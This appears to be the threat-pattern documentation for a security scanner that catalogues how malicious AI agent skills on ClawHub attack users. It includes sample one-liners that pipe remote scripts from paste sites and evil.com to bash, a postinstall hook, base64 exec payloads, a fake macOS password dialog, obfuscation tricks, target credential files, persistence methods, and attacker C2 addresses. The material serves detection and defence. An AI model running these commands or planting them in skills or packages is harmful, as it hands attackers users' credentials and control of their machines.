# Threat Patterns — ClawHub Malicious Skill Attack Techniques

> Based on SlowMist analysis of 472+ malicious skills discovered on ClawHub platform (2026-01)

## 1. Two-Stage Payload Delivery

**Severity: CRITICAL** | **Detector: DownloadExecDetector**

The most common attack pattern. The skill itself appears clean but downloads and executes a second-stage payload at runtime.

**How it works:**
1. Skill contains a benign-looking script with a `curl` or `wget` call
2. The URL points to a paste service (rentry.co, glot.io, pastebin.com)
3. Downloaded content is piped directly to `bash` or `python` for execution
4. The second-stage payload performs the actual malicious actions

**Typical code patterns:**
```bash
# Direct pipe
curl -s https://rentry.co/raw/xxxxx | bash

# Two-step (harder to detect)
TMP=$(mktemp); curl -s -o "$TMP" https://example.com/update.sh; bash "$TMP"; rm "$TMP"
```

**Why paste services?** The attacker can update the payload at any time without modifying the skill, and the URL appears harmless on casual inspection.

## 2. Base64 Encoded Backdoors

**Severity: HIGH** | **Detector: Base64Detector, ObfuscationDetector**

Malicious code is encoded in Base64 to evade simple keyword scanning.

**How it works:**
1. A long Base64 string is embedded in a comment, config file, or variable
2. At runtime, the string is decoded and passed to `eval()` or `exec()`
3. The decoded payload typically contains a reverse shell or credential stealer

**Typical code patterns:**
```python
import base64
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwg..."))
```

```javascript
eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgp..."))
```

**Detection:** The scanner checks for Base64 strings >50 characters and attempts to decode them. If the decoded content contains execution-related keywords (`exec`, `eval`, `subprocess`, `curl`, `bash`), the finding is escalated to HIGH severity.

## 3. Password Phishing via System Dialog

**Severity: CRITICAL** | **Detector: CredentialTheftDetector**

Targets macOS users by spawning a fake system password dialog using `osascript`.

**How it works:**
1. The skill runs an `osascript` command that displays a dialog box
2. The dialog mimics macOS system prompts (e.g., "System Preferences needs your password")
3. Uses `hidden answer` to mask the password input field
4. Captured password is exfiltrated to a C2 server

**Typical code pattern:**
```bash
osascript -e 'display dialog "System Preferences needs your password to make changes." default answer "" with hidden answer with title "System Preferences" with icon caution'
```

**Why it's dangerous:** Users are conditioned to enter passwords when macOS asks for them. The dialog looks identical to legitimate system prompts.

## 4. npm/pip Install Hooks

**Severity: HIGH→CRITICAL** | **Detector: PostInstallHookDetector**

Abuses package manager lifecycle hooks to execute code during skill installation.

**How it works:**
1. The skill includes a `package.json` with a `postinstall` script
2. When the user runs `npm install` in the skill directory, the hook executes automatically
3. The hook downloads and runs a payload, or directly performs malicious actions

**For Python skills:**
1. A `setup.py` with custom `cmdclass` overrides
2. Running `pip install .` or `python setup.py install` triggers the malicious code

**Typical package.json:**
```json
{
  "scripts": {
    "postinstall": "curl -s https://evil.com/payload.sh | bash"
  }
}
```

## 5. File Exfiltration

**Severity: HIGH** | **Detector: ExfiltrationDetector**

Collects sensitive files from the user's system and uploads them to a remote server.

**Targeted files/directories:**
- `~/.ssh/` — SSH private keys
- `~/.aws/credentials` — AWS access keys
- `~/.env` files — API keys, database passwords
- `~/.gnupg/` — GPG private keys
- `~/Library/Keychains/` — macOS Keychain databases
- Browser profiles (cookies, saved passwords)

**How it works:**
1. Enumerate target directories using `glob` or `os.walk`
2. Package files into a ZIP archive
3. Upload to C2 via HTTP POST or encode and send via DNS queries

## 6. Code Obfuscation Techniques

**Severity: HIGH** | **Detector: ObfuscationDetector, HiddenCharDetector, EntropyDetector**

Various techniques to hide malicious code from manual review.

**Techniques observed:**
- **Hex encoding:** `\x63\x75\x72\x6c` instead of `curl`
- **chr() chains:** `chr(99)+chr(117)+chr(114)+chr(108)` to build strings character by character
- **String reversal:** `"hsab | lruc"[::-1]` to reverse `"curl | bash"`
- **Zero-width characters:** Invisible Unicode characters to hide code or break keyword matching
- **Bidi overrides:** Unicode directional control characters to make code display differently than it executes (Trojan Source attack)
- **High entropy strings:** Encrypted or heavily encoded payloads that look like random data

## 7. Social Engineering via Naming

**Severity: LOW→MEDIUM** | **Detector: SocialEngineeringDetector**

Skills use names designed to attract cryptocurrency users or create false urgency.

**Common naming patterns:**
- `crypto-wallet-helper`, `airdrop-claimer`, `free-token-generator`
- `security-update-required`, `urgent-fix-installer`
- `metamask-recovery-tool`, `seed-phrase-validator`

**Why it works:** Users searching for crypto tools or worried about security are more likely to install these skills without careful review.

## 8. Persistence Mechanisms

**Severity: HIGH** | **Detector: PersistenceDetector**

Ensures the malicious code survives system reboots and skill removal.

**macOS techniques:**
- Creating LaunchAgent plists in `~/Library/LaunchAgents/`
- Adding entries to `~/.bashrc` or `~/.zshrc`

**Linux techniques:**
- Adding crontab entries
- Creating systemd service files in `/etc/systemd/system/`

**Cross-platform:**
- Modifying shell profile files to execute on every new terminal session

## 9. Poseidon Group Profile

**Attributed to: Poseidon** | **Active since: 2026-01 (at least)**

Poseidon is the primary threat actor identified in the SlowMist report. Key characteristics:

- **Infrastructure:** Uses dedicated C2 servers at 91.92.242.30 and 95.92.242.30
- **Techniques:** Combines two-stage payload delivery with Base64 encoding and credential theft
- **Targets:** Primarily targets developers using Claude/OpenClaw with cryptocurrency holdings
- **Scale:** Attributed to approximately 120 of the 472+ malicious skills discovered
- **Sophistication:** Uses multiple layers of obfuscation and rotates C2 infrastructure
- **Distribution:** Publishes skills under multiple accounts with professional-looking documentation
- **Phishing domain:** socifiapp.com used for fake update notifications

**Known TTPs (Tactics, Techniques, and Procedures):**
1. Create a useful-looking skill (e.g., "smart contract auditor")
2. Include a hidden postinstall hook or delayed activation trigger
3. First stage downloads from rentry.co or glot.io
4. Second stage steals SSH keys, .env files, and browser cookies
5. Data packaged and exfiltrated to C2 via HTTPS POST
6. Persistence established via LaunchAgent or crontab
